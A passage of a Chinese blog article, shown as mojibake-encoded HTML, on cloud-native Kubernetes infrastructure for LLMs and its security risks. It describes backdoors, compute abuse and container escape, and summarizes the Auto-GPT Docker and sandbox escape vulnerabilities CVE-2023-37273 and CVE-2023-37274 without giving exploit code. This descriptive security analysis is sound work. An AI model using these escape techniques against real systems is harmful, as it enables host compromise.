GPUï¼‰ã€ç½‘ç»œå’Œå­˜å‚¨èƒ½åŠ›ï¼Œå¹¶ç»“åˆæœ‰æ•ˆçš„èµ„æºéš”ç¦»å’Œå…±äº«æœºåˆ¶ï¼ŒCNAI æŠ€æœ¯æ˜¾è‘—æå‡äº† AI åº”ç”¨çš„æ€§èƒ½ï¼Œå¹¶æœ‰åŠ©äºé™ä½è¿è¥æˆæœ¬ã€‚</p><p><img src="/image/image_hadc0WRcug.png" alt="å›¾ 2ï¼šç›¸å…³æŠ€æœ¯å’ŒæŠ€èƒ½" title="å›¾2ï¼šç›¸å…³æŠ€æœ¯å’ŒæŠ€èƒ½"></p><p>ä¸ä»…å¦‚æ­¤ï¼Œäº‘åŸç”Ÿå¯¹äºäººå·¥æ™ºèƒ½çš„ä»·å€¼åœ¨äº‘æœåŠ¡æä¾›å•†å’Œï¼ˆæˆ–ï¼‰äººå·¥æ™ºèƒ½å…¬å¸å‘å¸ƒçš„æ–‡ç« ä¸­å¾—ä»¥ä½“ç°ï¼Œä¾‹å¦‚ï¼š</p><ul><li>2023 å¹´ 5 æœˆ 24 æ—¥ï¼Œ<a href="https://huggingface.co/blog/hugging-face-endpoints-on-azure" title="Hugging Face ä¸å¾®è½¯åˆä½œåœ¨ Azure ä¸Šæ¨å‡º Hugging Face æ¨¡å‹ç›®å½•">Hugging Face ä¸å¾®è½¯åˆä½œåœ¨ Azure ä¸Šæ¨å‡º Hugging Face æ¨¡å‹ç›®å½•</a>ï¼›</li><li>2016 å¹´ 8 æœˆ 29 æ—¥ï¼ŒOpenAI å‘è¡¨äº†ä¸€ç¯‡åä¸º<a href="https://openai.com/index/infrastructure-for-deep-learning/" title="ã€ŠInfrastructure for deep learningã€‹">ã€ŠInfrastructure for deep learningã€‹</a>çš„æ–‡ç« ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼ŒOpenAI æ­ç¤ºäº†ä»–ä»¬å°†<a href="https://github.com/openai/kubernetes-ec2-autoscaler" title="kubernetes-ec2-autoscaler">kubernetes-ec2-autoscaler</a>ä½œä¸º Kubernetes ä¸Šçš„æ™®é€šçš„ pod è¿è¡Œï¼Œå¯¹é›†ç¾¤è¿›è¡Œæ‰¹é‡ä¼˜åŒ–ï¼›</li><li>2018 å¹´ 1 æœˆ 18 æ—¥ï¼ŒOpenAI å®£å¸ƒä»–ä»¬å·²ç»<a href="https://openai.com/index/scaling-kubernetes-to-2500-nodes/" title="å°†Kubernetes æ‰©å±•åˆ°2500ä¸ªèŠ‚ç‚¹">å°† Kubernetes æ‰©å±•åˆ° 2500 ä¸ªèŠ‚ç‚¹</a>äº†ï¼›</li><li>2021 å¹´ 1 æœˆ 25 æ—¥ï¼ŒOpenAI å†æ¬¡å®£å¸ƒä»–ä»¬å·²å°†<a href="https://openai.com/index/scaling-kubernetes-to-7500-nodes/" title="Kubernetes é›†ç¾¤æ‰©å±•åˆ°7500ä¸ªèŠ‚ç‚¹">Kubernetes é›†ç¾¤æ‰©å±•åˆ° 7500 ä¸ªèŠ‚ç‚¹</a>ï¼Œå¯ä¸º<a href="https://arxiv.org/abs/2005.14165" title="GPT-3">GPT-3</a>ã€<a href="https://openai.com/index/clip/" title="CLIP">CLIP</a> å’Œ<a href="https://openai.com/index/dall-e/" title="DALLÂ·E">DALLÂ·E</a>å¤§æ¨¡å‹æä¾›ä¸€ä¸ªå¯æ‰©å±•çš„åŸºç¡€è®¾ç½®ï¼ŒåŒæ—¶ä¹Ÿé€‚ç”¨äºå¿«é€Ÿçš„å°è§„æ¨¡è¿­ä»£ç ”ç©¶ï¼ˆä¾‹å¦‚<a href="https://arxiv.org/abs/2001.08361" title="ç¥ç»è¯­è¨€æ¨¡å‹çš„æ‰©å±•æ³•åˆ™">ç¥ç»è¯­è¨€æ¨¡å‹çš„æ‰©å±•æ³•åˆ™</a>ï¼‰</li><li>â€¦â€¦</li></ul><p>OpenAI æœ€å¤§è§„æ¨¡çš„å·¥ä½œè´Ÿè½½æ˜¯ç›´æ¥ç®¡ç†çš„è£¸äº‘è™šæ‹Ÿæœºï¼Œè€Œ Kubernetes ç”±äºå¿«é€Ÿçš„è¿­ä»£å‘¨æœŸã€åˆç†çš„å¯æ‰©å±•æ€§ä»¥åŠå‡ ä¹ä¸ç”¨å†™æ ·æ¿ä»£ç çš„ç‰¹æ€§ï¼Œæˆä¸ºäº† OpenAI å›¢é˜Ÿå¤§å¤šæ•°å®éªŒçš„ç†æƒ³é€‰æ‹©ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»¥ OpenAI å›¢é˜Ÿçš„ LLM åŸºç¡€è®¾æ–½å®è·µä½œä¸ºæ¡ˆä¾‹ï¼Œä»‹ç»å½“å‰ LLM ç®—åŠ›ç»“æ„å’Œåº”ç”¨æ¶æ„ã€‚</p><h3 id="2-1-é«˜æ•ˆèµ„æºè°ƒåº¦ä¸å¼¹æ€§æ‰©å±•"><a href="#2-1-é«˜æ•ˆèµ„æºè°ƒåº¦ä¸å¼¹æ€§æ‰©å±•" class="headerlink" title="2.1 é«˜æ•ˆèµ„æºè°ƒåº¦ä¸å¼¹æ€§æ‰©å±•"></a>2.1 é«˜æ•ˆèµ„æºè°ƒåº¦ä¸å¼¹æ€§æ‰©å±•</h3><p>äº‘åŸç”Ÿå¹³å°ä»¥å…¶çµæ´»çš„è°ƒåº¦èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿…é€Ÿå“åº”è®¡ç®—èµ„æºçš„éœ€æ±‚ï¼Œå®ç°èµ„æºçš„å¼¹æ€§æ‰©å±•ä¸æ”¶ç¼©ã€‚è¿™ä¸€ç‰¹æ€§å¯¹äºæ‰§è¡Œå¤§å‹æœºå™¨å­¦ä¹ ä»»åŠ¡å°¤ä¸ºé‡è¦ï¼Œå› ä¸ºè¿™äº›ä»»åŠ¡åœ¨å…¨é¢åˆ©ç”¨æ¯ä¸ªèŠ‚ç‚¹çš„ç¡¬ä»¶èµ„æºæ—¶ï¼Œèƒ½å¤Ÿè¾¾åˆ°æœ€ä¼˜çš„è¿è¡Œæ•ˆç‡ã€‚</p><p>OpenAI å›¢é˜Ÿå€ŸåŠ©<a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kube-scheduler/" title="kube-scheduler">kube-scheduler</a>çš„åŠ¨æ€è°ƒåº¦åŠŸèƒ½ï¼Œæœ‰æ•ˆæå‡äº†èµ„æºåˆ©ç”¨ç‡å’Œè¿è¡Œæ•ˆç‡ã€‚è¿™ç§è°ƒåº¦æ–¹å¼ä½¿å¾— GPU ä¹‹é—´èƒ½å¤Ÿé€šè¿‡<a href="https://www.nvidia.com/en-us/data-center/nvlink/" title="NVLink">NVLink</a>å®ç°ç›´æ¥çš„äº¤å‰é€šä¿¡ï¼ŒåŒæ—¶ä¹Ÿèƒ½é€šè¿‡<a href="https://developer.nvidia.com/gpudirect" title="GPUDirect">GPUDirect</a>æŠ€æœ¯ä¸ NIC è¿›è¡Œç›´æ¥é€šä¿¡ã€‚</p><p>åœ¨ OpenAI çš„ä¼—å¤šå·¥ä½œè´Ÿè½½ä¸­ï¼Œå¸¸è§åšæ³•æ˜¯ä¸€ä¸ª pod ç‹¬å æ•´ä¸ªèŠ‚ç‚¹ï¼Œä»è€Œé¿å…äº† NUMAã€CPU æˆ– PCIE èµ„æºç«äº‰çš„é—®é¢˜ã€‚æ­¤å¤–ï¼ŒOpenAI é›†ç¾¤æ‹¥æœ‰çš„å®Œæ•´å¯¹åˆ†å¸¦å®½ï¼Œæ— éœ€æ‹…å¿§æœºæ¶æˆ–ç½‘ç»œæ‹“æ‰‘çš„é™åˆ¶ã€‚</p><p>å¾—ç›Šäºè¿™äº›ä¼˜åŒ–æªæ–½ï¼Œå³ä½¿ç®¡ç†ç€ä¼—å¤šèŠ‚ç‚¹ï¼Œè°ƒåº¦å™¨çš„å‹åŠ›ä¹Ÿç›¸å¯¹è¾ƒè½»ã€‚ä¸è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œkube-scheduler çš„å‹åŠ›å…·æœ‰çªå‘æ€§ï¼Œæ–°ä½œä¸šçš„å¯åŠ¨å¯èƒ½ä¼šå¼•å‘æ•°ç™¾ä¸ª pod çš„å³æ—¶åˆ›å»ºï¼Œä½†éšåèµ„æºçš„å˜åŠ¨ç‡ä¼šè¿…é€Ÿé™ä½ã€‚</p><p><img src="/image/image_HhWxWR0KgO.png" alt="å›¾ 3ï¼šOpenAI çš„ kube-scheduler çš„è°ƒåº¦å‹åŠ›" title="å›¾3ï¼šOpenAI çš„ kube-scheduler çš„è°ƒåº¦å‹åŠ›"></p><h3 id="2-2-å®¹å™¨åŒ–ä¸å¾®æœåŠ¡æ¶æ„"><a href="#2-2-å®¹å™¨åŒ–ä¸å¾®æœåŠ¡æ¶æ„" class="headerlink" title="2.2 å®¹å™¨åŒ–ä¸å¾®æœåŠ¡æ¶æ„"></a>2.2 å®¹å™¨åŒ–ä¸å¾®æœåŠ¡æ¶æ„</h3><p>é€šè¿‡å®¹å™¨åŒ–æŠ€æœ¯ï¼Œäººä»¬å¯ä»¥å°† AI åº”ç”¨å’Œæ¨¡å‹æ‰“åŒ…ä¸ºç‹¬ç«‹çš„å®¹å™¨ï¼Œä½¿å…¶å…·å¤‡è‰¯å¥½çš„å¯ç§»æ¤æ€§å’Œå¯éƒ¨ç½²æ€§ã€‚OpenAI çš„ Kubernetes è¦æ±‚æ¯ä¸ªä½œä¸šéƒ½æ˜¯ä¸€ä¸ª Docker å®¹å™¨ï¼Œä»¥å…·å¤‡ä»¥æ¥éš”ç¦»å’Œä»£ç å¿«ç…§çš„èƒ½åŠ›ï¼Œä½¿ AI ç®—åŠ›å¯ä»¥åœ¨ä¸åŒçš„ç¯å¢ƒä¸­è¿è¡Œã€‚</p><p>ç„¶è€Œï¼Œæ„å»ºä¸€ä¸ªæ–°çš„ Docker å®¹å™¨å¯èƒ½ä¼šä¸ºç ”ç©¶äººå‘˜çš„è¿­ä»£å‘¨æœŸå¢åŠ å®è´µçš„é¢å¤–ç§’æ•°ï¼Œå› æ­¤ OpenAI å›¢é˜Ÿè¿˜æä¾›å·¥å…·ï¼Œå°†ä»£ç é€æ˜åœ°ä»ç ”ç©¶äººå‘˜çš„ç¬”è®°æœ¬ç”µè„‘ä¼ è¾“åˆ°æ ‡å‡†é•œåƒä¸­ã€‚æ­¤å¤–ï¼Œå¾®æœåŠ¡ç»“æ„å°†åº”ç”¨æ‹†åˆ†ä¸ºå¤šä¸ªç‹¬ç«‹çš„å¾®æœåŠ¡ã€‚æ¯ä¸ªå¾®æœåŠ¡è´Ÿè´£ç‰¹å®šçš„åŠŸèƒ½ï¼Œä½¿å¾— LLM çš„å¼€å‘å’Œç»´æŠ¤å˜å¾—æ›´åŠ ç®€å•å’Œçµæ´»ã€‚</p><p><img src="/image/image_S0WY3twU1K.png" alt="å›¾ 4ï¼šTensorBoard ä¸­çš„æ¨¡å‹å­¦ä¹ æ›²çº¿" title="å›¾4ï¼šTensorBoard ä¸­çš„æ¨¡å‹å­¦ä¹ æ›²çº¿"></p><h3 id="2-3-äº‘åŸç”ŸåŸºç¡€è®¾æ–½è½¬å‹"><a href="#2-3-äº‘åŸç”ŸåŸºç¡€è®¾æ–½è½¬å‹" class="headerlink" title="2.3 äº‘åŸç”ŸåŸºç¡€è®¾æ–½è½¬å‹"></a>2.3 äº‘åŸç”ŸåŸºç¡€è®¾æ–½è½¬å‹</h3><p>åœ¨æ¢è®¨ç†æƒ³çš„æ‰¹å¤„ç†ä½œä¸šæ€§èƒ½æ—¶ï¼ŒOpenAI å›¢é˜Ÿæ³¨æ„åˆ°ï¼Œè™½ç„¶å°†é›†ç¾¤ä¸­çš„èŠ‚ç‚¹æ•°é‡åŠ å€ç†è®ºä¸Šèƒ½ä½¿ä½œä¸šè¿è¡Œæ—¶é—´å‡åŠï¼Œä½†åœ¨æ·±åº¦å­¦ä¹ ä¸­ï¼Œå°¤å…¶æ˜¯å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„è¿ç®—ä¸­ï¼Œä½¿ç”¨å¤š GPU å¾€å¾€åªèƒ½å¸¦æ¥<a href="https://research.googleblog.com/2016/04/announcing-tensorflow-08-now-with.html" title="éå¸¸æ¬¡çº¿æ€§">éå¸¸æ¬¡çº¿æ€§</a>çš„åŠ é€Ÿæ•ˆæœã€‚å› æ­¤ï¼Œä¸ºäº†å®ç°é¡¶çº§æ€§èƒ½ï¼Œä»–ä»¬ä¸ä»…ä¾èµ–äºé¡¶çº§çš„ GPUï¼Œè¿˜æ³¨é‡äº LLM åŸºç¡€è®¾æ–½çš„äº‘åŸç”ŸåŒ–ã€‚</p><p>OpenAI å›¢é˜Ÿåœ¨å¤„ç† CPU å¯†é›†å‹ä»»åŠ¡ï¼Œå¦‚è¿è¡Œ<a href="https://gym.openai.com/envs#box2d" title="æ¨¡æ‹Ÿå™¨">æ¨¡æ‹Ÿå™¨</a>ã€<a href="https://gym.openai.com/envs#atari" title="å¼ºåŒ–å­¦ä¹ ç¯å¢ƒæˆ–å°è§„æ¨¡æ¨¡å‹">å¼ºåŒ–å­¦ä¹ ç¯å¢ƒæˆ–å°è§„æ¨¡æ¨¡å‹</a>æ—¶ï¼Œå¤§é‡ä½¿ç”¨äº† CPU èµ„æºã€‚è¿™äº›ä»»åŠ¡åœ¨ GPU ä¸Šçš„è¿è¡Œé€Ÿåº¦å¹¶ä¸æ›´å¿«ï¼Œå› æ­¤äº‘åŸç”ŸåŒ–åŸºç¡€è®¾æ–½çš„çµæ´»æ€§å’Œå¯æ‰©å±•æ€§åœ¨è¿™é‡Œæ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p><p><img src="https://images.ctfassets.net/kftzwdyauwt9/fc705186-3c3d-40eb-a2f96b4d94d5/6f3d0e0703333fd51f9719225cea0632/infra_img_3.png?w=3840&q=90&fm=webp" alt="å›¾ 5ï¼šnvidia-smi æ˜¾ç¤ºæ»¡è½½çš„ Titan Xs" title="å›¾5ï¼šnvidia-smi æ˜¾ç¤ºæ»¡è½½çš„ Titan Xs"></p><p>å¾—ç›Šäº<a href="https://aws.amazon.com/" title="AWS">AWS</a> æ…·æ…¨æèµ çš„å¤§é‡è®¡ç®—èµ„æºï¼ŒOpenAI å›¢é˜Ÿå¾—ä»¥åœ¨äº‘åŸç”ŸåŸºç¡€è®¾æ–½ä¸­è¿è¡Œ CPU å®ä¾‹ï¼Œå¹¶æ¨ªå‘æ‰©å±• GPU ä½œä¸šã€‚æ­¤å¤–ï¼Œå›¢é˜Ÿä¹Ÿè¿è¡Œç€è‡ªå·±çš„ç‰©ç†æœåŠ¡å™¨ï¼Œä¸»è¦é…å¤‡ <a href="http://www.geforce.com/hardware/10series/titan-x-pascal" title="Titan X">Titan X</a> GPUï¼Œè¿™äº›æœåŠ¡å™¨ä¸äº‘èµ„æºæ— ç¼é›†æˆï¼Œå…±åŒæ„æˆäº†ä¸€ä¸ªäº‘åŸç”ŸåŒ–çš„æ··åˆäº‘æ¶æ„ã€‚</p><p><img src="https://images.ctfassets.net/kftzwdyauwt9/a52d26e1-f8c2-4ffa-7f4eff0762f5/5326f78c72a04f09816a670ec4dbfc05/infra_img_4.png?w=3840&q=90&fm=webp" alt="å›¾ 6ï¼šåŒä¸€å°ç‰©ç†æœºå™¨ä¸Šè¿è¡Œçš„ htop æ˜¾ç¤ºæœ‰å¤§é‡çš„ç©ºé—² CPU" title="å›¾6ï¼š åŒä¸€å°ç‰©ç†æœºå™¨ä¸Šè¿è¡Œçš„ htop æ˜¾ç¤ºæœ‰å¤§é‡çš„ç©ºé—² CPU"></p><p>OpenAI å›¢é˜Ÿé•¿æœŸé‡‡ç”¨æ··åˆäº‘æ¶æ„ï¼Œè¿™ä¸ä»…æ˜¯å› ä¸ºä»–ä»¬éœ€è¦å°è¯•ä¸åŒçš„ GPUã€äº’è¿å’Œå…¶ä»–å¯èƒ½å¯¹æ·±åº¦å­¦ä¹ æœªæ¥é‡è¦çš„æŠ€æœ¯ï¼Œè€Œä¸”è¿˜å› ä¸ºä»–ä»¬è®¤è¯†åˆ°ï¼ŒåŸºç¡€è®¾æ–½çš„äº‘åŸç”ŸåŒ–å¯¹äºæä¾›ç®€æ´ã€ä¸€è‡´çš„ç®¡ç†ç•Œé¢è‡³å…³é‡è¦ã€‚ä»–ä»¬ä½¿ç”¨ <a href="https://www.terraform.io/" title="Terraform">Terraform</a>æ¥è®¾ç½® AWS äº‘èµ„æºï¼Œç¡®ä¿äº†äº‘åŸç”ŸåŸºç¡€è®¾æ–½çš„è‡ªåŠ¨åŒ–å’Œä¸€è‡´æ€§ã€‚</p><p><img src="https://images.ctfassets.net/kftzwdyauwt9/d402e835-f111-40e6-28379f980e29/9914c96270cca97d124bee3faba1a0c9/infra_img_5.png?w=1200&q=90&fm=webp" alt="å›¾ 7ï¼šOpenAI çš„éƒ¨åˆ† Terraform é…ç½®ç‰‡æ®µï¼Œç”¨äºç®¡ç†è‡ªåŠ¨ä¼¸ç¼©" title="å›¾7ï¼šOpenAI çš„éƒ¨åˆ† Terraformé…ç½®ç‰‡æ®µï¼Œç”¨äºç®¡ç†è‡ªåŠ¨ä¼¸ç¼©"></p><p>OpenAI çš„ LLM åŸºç¡€è®¾æ–½äº‘åŸç”ŸåŒ–ä½“ç°åœ¨ä»–ä»¬å¯¹ Kubernetes çš„ä½¿ç”¨ä¸Šï¼Œå®ƒä¸ä»…ä½œä¸ºç‰©ç†æœºå’Œ AWS èŠ‚ç‚¹çš„é›†ç¾¤è°ƒåº¦ç¨‹åºï¼Œè€Œä¸”è¿˜å…è®¸ç ”ç©¶äººå‘˜é€šè¿‡ Kubernetes çš„ flannel ç½‘ç»œæ— ç¼è®¿é—®ä»–ä»¬æ­£åœ¨è¿è¡Œçš„ä½œä¸šç½‘ç»œã€‚è¿™ç§æ¶æ„çš„çµæ´»æ€§ä½¿å¾—æ— è®ºæ˜¯å°è§„æ¨¡è¿˜æ˜¯å¤§è§„æ¨¡çš„ä½œä¸šï¼Œéƒ½èƒ½åœ¨äº‘åŸç”ŸåŒ–çš„åŸºç¡€è®¾æ–½ä¸­å¾—åˆ°æœ‰æ•ˆæ”¯æŒã€‚</p><p><img src="/image/image_-XX-bnC7gr.png" alt="å›¾ 8ï¼šOpenAI å›¢é˜Ÿçš„ Kubernetes é›†ç¾¤çš„å¯åŠ¨é…ç½®" title="å›¾8ï¼šOpenAI å›¢é˜Ÿçš„Kubernetes é›†ç¾¤çš„å¯åŠ¨é…ç½®"></p><h2 id="0x03-äº‘åŸç”Ÿåœºæ™¯ä¸‹çš„-LLM-é£é™©"><a href="#0x03-äº‘åŸç”Ÿåœºæ™¯ä¸‹çš„-LLM-é£é™©" class="headerlink" title="0x03 äº‘åŸç”Ÿåœºæ™¯ä¸‹çš„ LLM é£é™©"></a>0x03 äº‘åŸç”Ÿåœºæ™¯ä¸‹çš„ LLM é£é™©</h2><p>åœ¨å‘äº‘åŸç”Ÿåœºæ™¯è¿‡æ¸¡çš„è¿‡ç¨‹ä¸­ï¼ŒLLM é¢ä¸´å¤šç§é£é™©ï¼Œè¿™äº›é£é™©åŒ…æ‹¬ç®—åŠ›å¹³å°ã€ç®—åŠ›ç½‘ç»œã€AI åº”ç”¨ä»¥åŠå·¦ç§»é£é™©ã€‚</p><h3 id="3-1-ç®—åŠ›å¹³å°é£é™©"><a href="#3-1-ç®—åŠ›å¹³å°é£é™©" class="headerlink" title="3.1 ç®—åŠ›å¹³å°é£é™©"></a>3.1 ç®—åŠ›å¹³å°é£é™©</h3><p>ç®—åŠ›å¹³å°é£é™©æ˜¯æŒ‡åœ¨ä½¿ç”¨äº‘è®¡ç®—ç­‰ç®—åŠ›å¹³å°è¿›è¡Œå¤§å‹è¯­è¨€æ¨¡å‹è®­ç»ƒå’Œæ¨ç†æ—¶å¯èƒ½é¢ä¸´çš„ä¸€ç³»åˆ—æ½œåœ¨å¨èƒï¼ŒåŒ…æ‹¬ç®—åŠ›ç¯å¢ƒé€ƒé€¸ã€ç®—åŠ›æ»¥ç”¨å’ŒæŒä¹…åŒ–åé—¨ç­‰ã€‚</p><h4 id="3-1-1-æŒä¹…åŒ–åé—¨"><a href="#3-1-1-æŒä¹…åŒ–åé—¨" class="headerlink" title="3.1.1 æŒä¹…åŒ–åé—¨"></a>3.1.1 æŒä¹…åŒ–åé—¨</h4><p>æŒä¹…åŒ–åé—¨æŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­æ¤å…¥çš„éšè—å…¥å£ç‚¹ï¼Œè¿™äº›å…¥å£ç‚¹å¯ä»¥åœ¨æ”»å‡»è€…ä¸å—æ„ŸæŸ“ç³»ç»Ÿä¹‹é—´å»ºç«‹é•¿æœŸçš„ã€æœªç»æˆæƒçš„é€šä¿¡æ¸ é“ã€‚åœ¨ AI é¢†åŸŸï¼ŒæŒä¹…åŒ–åé—¨å¯èƒ½è¢«æ¤å…¥åˆ° LLM æ¨¡å‹ä¸­ï¼Œä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿåœ¨ä¸è¢«å¯Ÿè§‰çš„æƒ…å†µä¸‹è¿œç¨‹è®¿é—®ã€æ“çºµæˆ–çªƒå–æ¨¡å‹æ•°æ®ã€‚</p><p>ç”±äºåé—¨å¯èƒ½éå¸¸éšè”½ï¼Œå®ƒä»¬å¯èƒ½åœ¨å¾ˆé•¿æ—¶é—´å†…éƒ½æœªè¢«æ£€æµ‹åˆ°ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æŒç»­åœ°è®¿é—®å’Œåˆ©ç”¨å—æ„ŸæŸ“çš„ AI æœåŠ¡ã€‚åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œç”±äºæœåŠ¡çš„åŠ¨æ€æ€§å’Œå¤æ‚æ€§ï¼Œæ£€æµ‹å’Œé˜²å¾¡æŒä¹…åŒ–åé—¨å˜å¾—æ›´åŠ å›°éš¾ï¼Œéœ€è¦é‡‡ç”¨æŒç»­çš„å®‰å…¨ç›‘æ§ã€ä»£ç å®¡è®¡å’Œå¼‚å¸¸è¡Œä¸ºåˆ†æç­‰æ‰‹æ®µã€‚</p><h4 id="3-1-2-ç®—åŠ›æ»¥ç”¨"><a href="#3-1-2-ç®—åŠ›æ»¥ç”¨" class="headerlink" title="3.1.2 ç®—åŠ›æ»¥ç”¨"></a>3.1.2 ç®—åŠ›æ»¥ç”¨</h4><p>ç®—åŠ›æ»¥ç”¨æ˜¯æŒ‡æ”»å‡»è€…ä¸æ­£å½“åœ°ä½¿ç”¨è®¡ç®—èµ„æºï¼Œä»¥è¾¾åˆ°éæ³•ç›®çš„ã€‚ä¾‹å¦‚ï¼šé€šè¿‡è¿‡åº¦å ç”¨ LLM çš„è®¡ç®—èµ„æºæ¥è¿›è¡Œæ¶æ„è®­ç»ƒã€æ‰§è¡Œéæ³•æ¨ç†ä»»åŠ¡æˆ–è¿›è¡ŒåŠ å¯†è´§å¸æŒ–çŸ¿ç­‰è¡Œä¸ºã€‚ç®—åŠ›æ»¥ç”¨ä¸ä»…ä¼šå¯¼è‡´äº‘æœåŠ¡æä¾›å•†çš„æˆæœ¬å¢åŠ ï¼Œè¿˜å¯èƒ½å½±å“å…¶ä»–ç§Ÿæˆ·çš„æœåŠ¡è´¨é‡ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´æ•´ä¸ªäº‘æœåŠ¡çš„æ€§èƒ½ä¸‹é™ã€‚</p><h4 id="3-1-3-ç®—åŠ›ç¯å¢ƒé€ƒé€¸"><a href="#3-1-3-ç®—åŠ›ç¯å¢ƒé€ƒé€¸" class="headerlink" title="3.1.3 ç®—åŠ›ç¯å¢ƒé€ƒé€¸"></a>3.1.3 ç®—åŠ›ç¯å¢ƒé€ƒé€¸</h4><p>åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…åˆ©ç”¨è½¯ä»¶æ¼æ´ã€é…ç½®é”™è¯¯æˆ–ä¸å½“çš„æƒé™è®¾ç½®ï¼Œä»ä¸€ä¸ªå—é™åˆ¶çš„ç®—åŠ›ç¯å¢ƒï¼ˆå¦‚å®¹å™¨ã€è™šæ‹Ÿæœºæˆ–æ²™ç®±ï¼‰ä¸­é€ƒé€¸å‡ºæ¥ï¼Œè·å¾—å¯¹åº•å±‚ä¸»æœºæˆ–å…¶ä»–ç§Ÿæˆ·èµ„æºçš„æœªæˆæƒè®¿é—®ã€‚ä¾‹å¦‚ï¼šåœ¨ LLM æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡æŸç§æ–¹å¼çªç ´è¿è¡Œæ—¶çš„é™åˆ¶ï¼Œè®¿é—®æˆ–æ§åˆ¶å…¶ä»–å®¹å™¨æˆ–æœåŠ¡ã€‚</p><p>2023 å¹´ 6 æœˆ 7 æ—¥åˆ° 6 æœˆ 14 æ—¥ï¼Œ<a href="https://positive.security/" title="Positive Security">Positive Security</a>çš„å®‰å…¨å·¥ç¨‹å¸ˆ <a href="https://www.linkedin.com/in/lukas-euler-bba6a3139/?locale=en_US" title="Lukas Euler">Lukas Euler</a>åœ¨å°è¯•ä½¿ç”¨<a href="https://autogpt.net/" title="Auto-GPT">Auto-GPT</a>çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸å¯é çš„ä»£ç æ‰§è¡Œå’Œ Docker é€ƒé€¸ï¼Œåæ¥ä»–é€šè¿‡æ”¹è¿›æœ‰æ•ˆè½½è·ä»¥å®ç°å¯é çš„ä»£ç æ‰§è¡Œå¹¶ç¡®å®š ANSI æ§åˆ¶åºåˆ—æ³¨å…¥ï¼Œå½“ä»–å°è¯•å¯»æ‰¾æ›´å¯é ã€æ›´å¹¿æ³›çš„ ANSI æ§åˆ¶åºåˆ—æ³¨å…¥æ—¶ï¼Œå´æœªæˆåŠŸã€‚</p><p><img src="/image/image_h_73lzYCRU.png" alt="å›¾ 9ï¼šAuto-GPT RCE æ¼æ´åˆ©ç”¨è·¯å¾„" title="å›¾9ï¼šAuto-GPT RCE æ¼æ´åˆ©ç”¨è·¯å¾„"></p><p><img src="/image/1111_Qe3IENqDi8.png" alt="å›¾ 10ï¼šæ³¨å…¥ ANSI æ§åˆ¶åºåˆ— \u001b[0;32m ä»¥æ‰“å°ç»¿è‰²" title="å›¾ 10ï¼šæ³¨å…¥ ANSI æ§åˆ¶åºåˆ— \u001b[0;32m ä»¥æ‰“å°ç»¿è‰²"></p><p>2023 å¹´ 7 æœˆ 11 æ—¥ Auto-GPT å›¢é˜Ÿä¿®å¤äº†è¯¥æ¼æ´å¹¶å‘å¸ƒäº† 3 ç¯‡å®‰å…¨å…¬å‘Šã€‚</p><p><img src="/image/image_27lSMotZPV.png" alt="å›¾ 11ï¼šAuto-GPT å›¢é˜Ÿä¿®å¤äº†è¯¥æ¼æ´å¹¶å‘å¸ƒäº† 3 ç¯‡å®‰å…¨å…¬å‘Š" title="å›¾ 11ï¼š Auto-GPT å›¢é˜Ÿä¿®å¤äº†è¯¥æ¼æ´å¹¶å‘å¸ƒäº†3ç¯‡å®‰å…¨å…¬å‘Š"></p><p>2023 å¹´ 7 æœˆ 13 æ—¥ï¼ŒNVD ç»™æ¼æ´â€œ<a href="https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-x5gj-2chr-4ch6" title="Docker escape when running from docker-compose.yml included in git repo">Docker escape when running from docker-compose.yml included in git repo</a>â€é¢å¸ƒäº†ç¼–å· CVE-2023-37273ï¼Œå¹¶å°†å…¶å¨èƒç­‰çº§è¯„ä¸ºâ€œé«˜å±â€ï¼Œè¯¥æ¼æ´å¯ä»¥è¦†ç›– docker-compose.yml æ–‡ä»¶å¹¶è¿›è¡Œæ»¥ç”¨ï¼Œåœ¨ä¸‹æ¬¡å¯åŠ¨ Auto-GPT æ—¶ä¼šè·å¾—ä¸»æœºç³»ç»Ÿçš„æ§åˆ¶æƒé™ã€‚</p><p><img src="/image/image_-o8_fcifCo.png" alt="å›¾ 12ï¼šCVE-2023-37273 æ¼æ´" title="å›¾ 12ï¼šCVE-2023-37273 æ¼æ´"></p><p>åŒæ—¶ï¼Œæ¼æ´â€œ<a href="https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-5h38-mgp9-rj5f" title="Python code execution sandbox escape in non-docker version">Python code execution sandbox escape in non-docker version</a>â€è¢«é¢å¸ƒäº†<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37274" title="CVE-2023-37274">CVE-2023-37274</a>ç¼–å·ï¼Œè¯¥æ¼æ´å¯ä»¥åœ¨è¿è¡Œ Auto-GPT çš„ä¸»æœºä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œè¿›ä¸€æ­¥é€ æˆæŒä¹…åŒ–æ”»å‡»ã€‚</p><p><img src="/image/image_PSswyBCAm1.png" alt="å›¾ 13ï¼šCVE-2023-37274 æ¼æ´" title="å›¾ 13ï¼šCVE-2023-37274 æ¼æ´"></p><h3 id="3-2-ç®—åŠ›ç½‘ç»œé£é™©"><a href="#3-2-ç®—åŠ›ç½‘ç»œé£é™©" class="headerlink" title="3.2 ç®—åŠ›ç½‘ç»œé£é™©"></a>3.2 ç®—åŠ›ç½‘ç»œé£é™©</h3><p>ç®—åŠ›ç½‘ç»œé£é™©ä¸»è¦æ˜¯æŒ‡åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œç”±äºç½‘ç»œçš„å¼€æ”¾æ€§ã€å¤æ‚æ€§ä»¥åŠèµ„æºå…±äº«çš„ç‰¹æ€§ï¼Œå¯¼è‡´ 